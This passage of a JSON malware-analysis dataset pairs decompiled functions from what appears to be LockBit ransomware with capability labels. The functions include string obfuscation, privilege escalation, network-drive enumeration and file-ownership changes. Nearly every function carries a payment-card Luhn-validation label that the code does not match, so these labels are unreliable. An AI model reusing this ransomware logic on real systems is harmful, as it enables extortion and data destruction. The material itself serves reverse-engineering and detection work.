        "decompiled_code": "\nint32_t __cdecl fcn.00406040(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    uint arg_10h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    \n    uVar1 = *(arg_8h + 4);\n    arg_8h_00 = arg_8h + 8;\n    uVar2 = fcn.00404640(arg_8h_00);\n    if ((uVar1 == uVar2) && (uVar1 < 0x401)) {\n        iVar3 = fcn.00402060(arg_8h_00, 0);\n        if (0 < iVar3) {\n            iVar3 = fcn.00403660(arg_8h_00, 0);\n            if (iVar3 != 0) {\n                iVar3 = fcn.00402060(arg_8h + 0x14, 0);\n                if (0 < iVar3) {\n                    fcn.00403700(&var_ch);\n                    iVar3 = fcn.00404300(&var_ch, arg_ch, *(arg_8h + 4));\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.004020a0(&var_ch, arg_8h_00);\n                        if (iVar3 < 0) {\n                            arg_10h_00 = *(arg_8h + 4);\n                            iVar3 = fcn.00402800(&var_ch, &var_ch, arg_8h + 0x14, arg_8h_00, arg_8h + 0x68);\n                            if (iVar3 == 0) {\n                                iVar3 = fcn.00404810(&var_ch, arg_10h, arg_10h_00);\n                            }\n                        }\n                        else {\n                            iVar3 = -4;\n                        }\n                    }\n                    fcn.00402ff0(&var_ch);\n                    if (iVar3 != 0) {\n                        return iVar3 + -0x4280;\n                    }\n                    return 0;\n                }\n            }\n        }\n    }\n    return -0x4080;\n}\n",
        "token_count": 494
    },
    "00406150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406150(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = *(arg_8h + 4);\n    iVar4 = arg_8h + 8;\n    uVar2 = fcn.00404640(iVar4);\n    if ((((uVar1 == uVar2) && (uVar1 < 0x401)) && (iVar3 = fcn.00402060(iVar4, 0),  0 < iVar3)) &&\n       (iVar4 = fcn.00403660(iVar4, 0),  iVar4 != 0)) {\n        if (arg_ch != 0) {\n            iVar4 = fcn.00402060(arg_8h + 0x2c, 0);\n            if (iVar4 < 1) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.00403660(arg_8h + 0x2c, 0);\n            if (iVar4 == 0) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.00402060(arg_8h + 0x38, 0);\n            if (iVar4 < 1) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.00403660(arg_8h + 0x38, 0);\n            if (iVar4 == 0) {\n                return 0xffffbf80;\n            }\n        }\n        iVar4 = fcn.00402060(arg_8h + 0x14, 0);\n        if (0 < iVar4) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n            iVar4 = fcn.00402060(arg_8h + 0x44, 0);\n            if (((0 < iVar4) && (iVar4 = fcn.00402060(arg_8h + 0x50, 0),  0 < iVar4)) &&\n               (iVar4 = fcn.00402060(arg_8h + 0x5c, 0),  0 < iVar4)) {\n                return 0;\n            }\n        }\n    }\n    return 0xffffbf80;\n}\n",
        "token_count": 522
    },
    "00406350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406350(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00408120(arg_8h, 0x118);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00406370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406370(uint arg_8h)\n\n{\n    fcn.0040cc00(arg_8h, 0, 0x118);\n    return;\n}\n",
        "token_count": 42
    },
    "00407ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ec0(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00408120(arg_8h, 0x6c);\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00407ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ee0(uint arg_8h)\n\n{\n    fcn.0040cc00(arg_8h, 0, 0x6c);\n    return;\n}\n",
        "token_count": 44
    },
    "00407f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407f00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_6ch;\n    \n    fcn.0040cc00(&var_6ch, 0, 0x6c);\n    iVar1 = fcn.00407f70(&var_6ch, arg_14h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00408040(&var_6ch, arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00407d00(&var_6ch, arg_10h);\n        }\n    }\n    fcn.00408120(&var_6ch, 0x6c);\n    return iVar1;\n}\n",
        "token_count": 191
    },
    "00408120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408120(uint arg_8h, uint arg_ch)\n\n{\n    (**0x422940)(arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 43
    },
    "00408140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408140(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    iVar1 = 0;\n    fcn.00403700(&var_ch);\n    if (arg_14h != 0) {\n        iVar1 = fcn.00404730(&var_ch, arg_8h, 1);\n        if (iVar1 != 0) goto code_r0x004081d6;\n        iVar1 = fcn.00403f50(arg_14h, arg_10h, &var_ch);\n        if (iVar1 != 0) goto code_r0x004081d6;\n    }\n    if (arg_18h != 0) {\n        iVar1 = fcn.00404730(&var_ch, arg_ch, 1);\n        if (iVar1 != 0) goto code_r0x004081d6;\n        iVar1 = fcn.00403f50(arg_18h, arg_10h, &var_ch);\n        if (iVar1 != 0) goto code_r0x004081d6;\n    }\n    if (arg_1ch != 0) {\n        iVar1 = fcn.00403720(arg_1ch, arg_ch, arg_8h);\n    }\ncode_r0x004081d6:\n    fcn.00402ff0(&var_ch);\n    return iVar1;\n}\n",
        "token_count": 344
    },
    "00409030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409030(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t arg_18h;\n    uint32_t uVar3;\n    uint var_3d8h;\n    uint var_1d0h;\n    uint var_90h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint32_t *var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_10h = 0;\n    var_ch = param_2;\n    fcn.00403700(&var_1ch);\n    fcn.00403700(&var_28h);\n    fcn.004059f0(0x428e68, 0, 0);\n    iVar1 = fcn.00404300(&var_1ch, 0x427000, 0x100);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00404300(&var_28h, 0x427100, 3);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00405940(0x428e68, &var_1ch, 0, 0, 0, &var_28h);\n            if (iVar1 == 0) {\n                fcn.00401a70(&var_1d0h);\n                fcn.00401710(&var_3d8h);\n                fcn.0040d210(&var_90h, 100);\n                iVar1 = fcn.00401c70(&var_1d0h, fcn.004015e0, &var_3d8h, &var_90h, 100);\n                if (iVar1 == 0) {\n                    var_4h = *param_2;\n                    uVar3 = 0;\n                    var_8h = 0;\n                    arg_18h = 0xf5;\n                    if (var_4h / 0xf5 != -1) {\n                        do {\n                            iVar1 = fcn.00405a20(0x428e68, fcn.00401a90, &var_1d0h, 0, arg_18h, param_1, \n                                                 uVar3 + 0x428960);\n                            if (iVar1 != 0) goto code_r0x004091b9;\n                            uVar2 = var_4h;\n                            if (0xf4 < var_4h) {\n                                uVar2 = arg_18h;\n                            }\n                            var_4h = var_4h - 0xf5;\n                            var_8h = var_8h + 1;\n                            param_1 = param_1 + 0xf5;\n                            uVar3 = uVar3 + 0x100;\n                            arg_18h = uVar2;\n                        } while (var_8h != *var_ch / 0xf5 + 1);\n                    }\n                    var_10h = 1;\n                    *var_ch = uVar3;\n                }\n            }\n        }\n    }\ncode_r0x004091b9:\n    fcn.00402ff0(&var_1ch);\n    fcn.00402ff0(&var_28h);\n    fcn.004055c0(0x428e68);\n    fcn.00401a40(&var_1d0h);\n    fcn.004015a0(&var_3d8h);\n    return var_10h;\n}\n",
        "token_count": 797
    },
    "00409200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409200(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_490h;\n    uint var_288h;\n    uint var_148h;\n    uint var_94h;\n    uint var_60h;\n    uint var_54h;\n    uint var_48h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    \n    uVar2 = 0;\n    fcn.00401a70(&var_288h);\n    fcn.004059f0(&var_148h, 0, 0);\n    fcn.00403700(&var_ch);\n    fcn.00403700(&var_18h);\n    fcn.00403700(&var_24h);\n    fcn.00403700(&var_30h);\n    fcn.00403700(&var_3ch);\n    fcn.00403700(&var_48h);\n    fcn.00403700(&var_54h);\n    fcn.00403700(&var_60h);\n    fcn.0040d210(&var_94h, 0x32);\n    fcn.00401710(&var_490h);\n    iVar1 = fcn.00401c70(&var_288h, fcn.004015e0, &var_490h, &var_94h, 0x32);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00405660(&var_148h, fcn.00401a90, &var_288h, 0x800, 0x10001);\n        if (iVar1 == 0) {\n            iVar1 = fcn.004053f0(&var_148h, &var_ch, &var_18h, &var_24h, &var_30h, &var_3ch);\n            if (iVar1 == 0) {\n                iVar1 = fcn.004054f0(&var_148h, &var_48h, &var_54h, &var_60h);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.00404810(&var_ch, *param_1, 0x100);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.00404810(&var_3ch, *param_1 + 0x100, 3);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.00404810(&var_30h, *param_1 + 0x103, 0x100);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.00404810(&var_18h, *param_1 + 0x203, 0x80);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.00404810(&var_24h, *param_1 + 0x283, 0x80);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.00404810(&var_48h, *param_1 + 0x303, 0x80);\n                                        if (iVar1 == 0) {\n                                            iVar1 = fcn.00404810(&var_54h, *param_1 + 899, 0x80);\n                                            if (iVar1 == 0) {\n                                                iVar1 = fcn.00404810(&var_60h, *param_1 + 0x403, 0x80);\n                                                if (iVar1 == 0) {\n                                                    uVar2 = 1;\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.00402ff0(&var_ch);\n    fcn.00402ff0(&var_18h);\n    fcn.00402ff0(&var_24h);\n    fcn.00402ff0(&var_30h);\n    fcn.00402ff0(&var_3ch);\n    fcn.00402ff0(&var_48h);\n    fcn.00402ff0(&var_54h);\n    fcn.00402ff0(&var_60h);\n    fcn.004055c0(&var_148h);\n    fcn.00401a40(&var_288h);\n    fcn.004015a0(&var_490h);\n    return uVar2;\n}\n",
        "token_count": 1002
    },
    "00409c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409c90(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint pExecInfo;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    int32_t var_e0h;\n    uint *var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    ushort var_6ch;\n    uint var_6ah;\n    uint16_t var_66h;\n    uint16_t var_64h;\n    uint16_t var_62h;\n    uint16_t var_60h;\n    uint16_t var_5eh;\n    uint16_t var_5ch;\n    uint16_t var_5ah;\n    uint16_t var_58h;\n    uint16_t var_56h;\n    uint16_t var_54h;\n    uint16_t var_52h;\n    uint16_t var_50h;\n    uint16_t var_4eh;\n    uint16_t var_4ch;\n    uint16_t var_4ah;\n    uint16_t var_48h;\n    uint16_t var_46h;\n    uint16_t var_44h;\n    uint16_t var_42h;\n    uint16_t var_40h;\n    uint16_t var_3eh;\n    uint16_t var_3ch;\n    uint16_t var_3ah;\n    uint16_t var_38h;\n    uint16_t var_36h;\n    uint16_t var_34h;\n    uint16_t var_32h;\n    uint16_t var_30h;\n    uint16_t var_2eh;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint16_t var_28h;\n    uint16_t var_26h;\n    ushort var_24h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    ushort var_12h;\n    uint var_10h;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x30);\n    var_b4h = 0x180038;\n    var_b0h = 0x7b0017;\n    var_6ah._0_2_ = *0x422ea8 ^ 0x38;\n    var_ach = 0x480018;\n    var_6ah._2_2_ = *0x422eaa ^ 0x38;\n    var_a8h = 0x560051;\n    var_66h = *0x422eac ^ 0x38;\n    var_a4h = 0x18005f;\n    var_64h = *0x422eae ^ 0x38;\n    var_a0h = 0x160009;\n    var_62h = str.ShutdownBlockReasonCreate._0_2_ ^ 0x38;\n    var_9ch = 0x160009;\n    var_60h = str.ShutdownBlockReasonCreate._2_2_ ^ 0x38;\n    var_98h = 0x160009;\n    var_5eh = str.ShutdownBlockReasonCreate._4_2_ ^ 0x38;\n    var_94h = 0x180009;\n    var_5ch = str.ShutdownBlockReasonCreate._6_2_ ^ 0x38;\n    var_90h = 0x560015;\n    var_5ah = str.ShutdownBlockReasonCreate._8_2_ ^ 0x38;\n    var_8ch = 0xa0018;\n    var_58h = str.ShutdownBlockReasonCreate._10_2_ ^ 0x38;\n    var_88h = 0x18000a;\n    var_56h = str.ShutdownBlockReasonCreate._12_2_ ^ 0x38;\n    var_84h = 0x180006;\n    var_54h = str.ShutdownBlockReasonCreate._14_2_ ^ 0x38;\n    var_80h = 0x4d0076;\n    var_52h = str.ShutdownBlockReasonCreate._16_2_ ^ 0x38;\n    var_7ch = 0x180054;\n    var_50h = str.ShutdownBlockReasonCreate._18_2_ ^ 0x38;\n    var_78h = 0x18001e;\n    var_4eh = str.ShutdownBlockReasonCreate._20_2_ ^ 0x38;\n    var_74h = 0x1d001a;\n    var_4ch = str.ShutdownBlockReasonCreate._22_2_ ^ 0x38;\n    var_70h = 0x1a004b;\n    var_4ah = str.ShutdownBlockReasonCreate._24_2_ ^ 0x38;\n    var_6ch = 0x38;\n    var_48h = *0x422eca ^ 0x38;\n    var_46h = str.user32._0_2_ ^ 0x38;\n    var_44h = str.user32._2_2_ ^ 0x38;\n    var_42h = str.user32._4_2_ ^ 0x38;\n    var_40h = *0x422ed2 ^ 0x38;\n    var_3eh = str.LockBit_Ransom._0_2_ ^ 0x38;\n    var_3ch = str.LockBit_Ransom._2_2_ ^ 0x38;\n    var_3ah = str.LockBit_Ransom._4_2_ ^ 0x38;\n    var_38h = str.LockBit_Ransom._6_2_ ^ 0x38;\n    var_36h = str.LockBit_Ransom._8_2_ ^ 0x38;\n    var_34h = str.LockBit_Ransom._10_2_ ^ 0x38;\n    var_32h = str.LockBit_Ransom._12_2_ ^ 0x38;\n    var_30h = *0x422ee2 ^ 0x38;\n    var_2eh = str._s_r_n._0_2_ ^ 0x38;\n    var_2ch = str._s_r_n._2_2_ ^ 0x38;\n    var_2ah = *0x422ee8 ^ 0x38;\n    var_28h = *0x422eea ^ 0x38;\n    var_26h = str.__.2u:_.2u:_.2u__._0_2_ ^ 0x38;\n    uVar2 = 0;\n    do {\n        *(&var_b4h + uVar2 * 2 + 2) = *(&var_b4h + uVar2 * 2 + 2) ^ 0x38;\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0x47);\n    var_24h = 0;\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &var_b4h + 2, *(*(iVar1 + 0x10) + 0x3c));\n    pExecInfo = 0x3c;\n    var_10h._0_2_ = *0x422e44 ^ 0x66;\n    var_ech = 0x400;\n    var_10h._2_2_ = *0x422e46 ^ 0x66;\n    var_e8h = 0;\n    var_ch = *0x422e48 ^ 0x66;\n    var_e4h = 0;\n    var_ah = *0x422e4a ^ 0x66;\n    var_22h = 0x50066;\n    var_8h = *0x422e4c ^ 0x66;\n    var_1eh = 0x2000b;\n    var_6h = *0x422e4e ^ 0x66;\n    var_1ah = 0x30048;\n    var_4h = *0x422e50 ^ 0x66;\n    uVar2 = 0;\n    var_16h = 0x3001e;\n    var_12h = 0x66;\n    var_2h = 0;\n    do {\n        *(&var_22h + uVar2 * 2 + 2) = *(&var_22h + uVar2 * 2 + 2) ^ 0x66;\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 0xf);\n    var_e0h = &var_22h + 2;\n    var_d8h = 0;\n    var_dch = &ARG_0;\n    var_d4h = 0;\n    var_d0h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n    return;\n}\n",
        "token_count": 2186
    },
    "0040a290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a290(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint arglist;\n    uint32_t uVar3;\n    uint uStack50;\n    uint uStack46;\n    uint uStack42;\n    uint uStack38;\n    uint uStack34;\n    uint uStack30;\n    uint uStack26;\n    uint uStack22;\n    uint uStack18;\n    uint uStack14;\n    uint16_t uStack10;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar2)(300000);\n        arglist = *0x42930c;\n        *0x42930c = 0;\n        uVar3 = 0;\n        uStack50 = *0x424780;\n        uStack46 = *0x424784;\n        uStack42 = *0x424788;\n        uStack38 = *0x42478c;\n        uStack18 = 0x2b222728;\n        uStack34 = *0x424d50;\n        uStack30 = *0x424d54;\n        uStack26 = *0x424d58;\n        uStack22 = *0x424d5c;\n        uStack14 = 0x2b3d613d;\n        uStack10 = 0x2d;\n        do {\n            uStack50._0_1_ = *0x424780;\n            puVar1 = &uStack50 + uVar3 + 1;\n            *puVar1 = *puVar1 ^ uStack50;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x28);\n        uStack10 = uStack10 & 0xff;\n        fcn.0040a0b0(&uStack50 + 1, arglist);\n    } while( true );\n}\n",
        "token_count": 427
    },
    "0040a370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a370(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t lpRootPathName;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    pcVar1 = _sym.imp.msvcrt.dll_free;\n    uVar4 = 0x1a;\n    lpRootPathName = *0x422f78;\n    var_10h._0_2_ = *0x422f7c;\n    do {\n        uVar4 = uVar4 - 1;\n        if ((*(&var_4h + (uVar4 >> 3)) >> (uVar4 & 7) & 1) != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(&lpRootPathName);\n            if (iVar2 == 4) {\n                var_8h = 0x200;\n                uVar3 = (*_sym.imp.msvcrt.dll_malloc)(0x400);\n                iVar2 = (*_sym.imp.MPR.dll_WNetGetConnectionW)(&lpRootPathName, uVar3, &var_8h);\n                if (iVar2 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_PathRemoveBackslashW)();\n                    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040a590, uVar3, 0, &var_ch);\n                    *(*0x429310 * 4 + 0x427960) = uVar3;\n                    LOCK();\n                    *0x429310 = *0x429310 + 1;\n                }\n                else {\n                    (*pcVar1)(uVar3);\n                }\n            }\n        }\n        lpRootPathName = lpRootPathName & 0xffff0000 | lpRootPathName - 1;\n    } while (uVar4 != 0);\n    fcn.0040a440();\n    return;\n}\n",
        "token_count": 484
    },
    "0040cae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040cae0(uint16_t *param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint16_t uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint16_t *puVar9;\n    uint32_t uVar10;\n    uint16_t **ppuVar11;\n    bool bVar12;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    (*_sym.imp.gdiplus.dll_GdipGetImageEncodersSize)(&var_4h, &var_8h);\n    if (var_8h != 0) {\n        iVar6 = (*_sym.imp.msvcrt.dll_malloc)(var_8h);\n        if (iVar6 != 0) {\n            (*_sym.imp.gdiplus.dll_GdipGetImageEncoders)(var_4h, var_8h, iVar6);\n            uVar10 = 0;\n            if (var_4h != 0) {\n                ppuVar11 = iVar6 + 0x30;\n                do {\n                    puVar9 = *ppuVar11;\n                    puVar7 = param_1;\n                    do {\n                        uVar2 = *puVar9;\n                        bVar12 = uVar2 < *puVar7;\n                        if (uVar2 != *puVar7) {\ncode_r0x0040cb6c:\n                            uVar8 = -bVar12 | 1;\n                            goto code_r0x0040cb71;\n                        }\n                        if (uVar2 == 0) break;\n                        uVar2 = puVar9[1];\n                        bVar12 = uVar2 < puVar7[1];\n                        if (uVar2 != puVar7[1]) goto code_r0x0040cb6c;\n                        puVar9 = puVar9 + 2;\n                        puVar7 = puVar7 + 2;\n                    } while (uVar2 != 0);\n                    uVar8 = 0;\ncode_r0x0040cb71:\n                    if (uVar8 == 0) {\n                        puVar1 = uVar10 * 0x4c + iVar6;\n                        uVar3 = puVar1[1];\n                        uVar4 = puVar1[2];\n                        uVar5 = puVar1[3];\n                        *param_2 = *puVar1;\n                        param_2[1] = uVar3;\n                        param_2[2] = uVar4;\n                        param_2[3] = uVar5;\n                        (*_sym.imp.msvcrt.dll_free)(iVar6);\n                        return uVar10;\n                    }\n                    uVar10 = uVar10 + 1;\n                    ppuVar11 = ppuVar11 + 0x13;\n                } while (uVar10 < var_4h);\n            }\n            (*_sym.imp.msvcrt.dll_free)(iVar6);\n            return 0xffffffff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 720
    },
    "0040cd80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040cd80(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint arglist;\n    uint8_t var_31h;\n    ushort var_30h;\n    uint var_2eh;\n    uint uStack46;\n    uint uStack42;\n    uint uStack38;\n    uint var_1eh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hObject;\n    \n    iVar2 = (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 0x28, &hObject);\n    if (iVar2 == 0) {\n        uVar3 = 0;\n        var_2eh = *0x4246e0;\n        uStack46 = *0x4246e4;\n        uStack42 = *0x4246e8;\n        uStack38 = *0x4246ec;\n        var_1eh._0_1_ = 0x2a;\n        do {\n            var_2eh._0_1_ = *0x4246e0;\n            puVar1 = &var_2eh + uVar3 + 1;\n            *puVar1 = *puVar1 ^ var_2eh;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x10);\n        var_1eh._1_1_ = 0;\n        (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, &var_2eh + 1, &var_ch);\n        var_18h = var_ch;\n        var_14h = var_8h;\n        stack0xffffffe0 = 1;\n        var_10h = 2;\n        arglist = hObject;\n        iVar2 = (*_sym.imp.ntdll.dll_NtAdjustPrivilegesToken)(hObject, 0, &var_1eh + 2, 0x10, 0, 0);\n        if (iVar2 != 0) {\n            uVar3 = 0;\n            var_31h = *0x424840;\n            var_30h = *0x424840 >> 8;\n            var_2eh._1_3_ = *0x424844;\n            var_2eh = CONCAT31(var_2eh._1_3_, *0x424840 >> 0x18);\n            uStack46._1_3_ = *0x424848;\n            uStack46 = CONCAT31(uStack46._1_3_, *0x424844 >> 0x18);\n            uStack42._1_3_ = *0x42484c;\n            uStack42 = CONCAT31(uStack42._1_3_, *0x424848 >> 0x18);\n            uStack38 = CONCAT31(0x69061c, *0x42484c >> 0x18);\n            var_1eh._0_1_ = 0x6d;\n            do {\n                *(&var_30h + uVar3) = *(&var_30h + uVar3) ^ var_31h;\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < 0x13);\n            var_1eh._1_1_ = 0;\n            fcn.0040a0b0(&var_30h, arglist);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return;\n}\n",
        "token_count": 802
    },
    "0040cf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040cf70(uint param_1)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_20h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar4 = 0;\n    var_8h = 0;\n    var_ch = param_1;\n    (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 8, &var_4h);\n    puVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x200);\n    if (puVar2 != NULL) {\n        iVar3 = (*_sym.imp.ntdll.dll_NtQueryInformationToken)(var_4h, 1, puVar2, 0x200, &var_8h);\n        if (iVar3 == 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&var_20h, 1);\n            if (iVar3 != 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorOwner)(&var_20h, *puVar2, 0);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetFileSecurityW;\n                if (iVar3 != 0) {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 1, &var_20h);\n                    if (iVar3 != 0) {\n                        iVar3 = (*pcVar1)(var_ch, 4, &var_20h);\n                        if (iVar3 != 0) {\n                            uVar4 = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (var_4h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_4h);\n    }\n    if (puVar2 != NULL) {\n        (*_sym.imp.msvcrt.dll_free)(puVar2);\n    }\n    return uVar4;\n}\n",
        "token_count": 466
    },
    "0041a410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.0041a410(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_FS_OFFSET;\n    uint arglist;\n    uint lpString1;\n    uint lpString2;\n    uint var_9ch;\n    uint var_97h;\n    uint uStack151;\n    uint uStack147;\n    uint uStack143;\n    uint var_87h;\n    uint uStack135;\n    uint uStack131;\n    uint uStack127;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    ushort var_6bh;\n    uchar var_69h;\n    uint var_68h;\n    uint var_64h;\n    uint var_5dh;\n    uint uStack93;\n    uint uStack89;\n    uint uStack85;\n    uint var_4dh;\n    uchar var_49h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint16_t var_2ch;\n    uint16_t var_2ah;\n    uint16_t var_28h;\n    uint16_t var_26h;\n    uint16_t 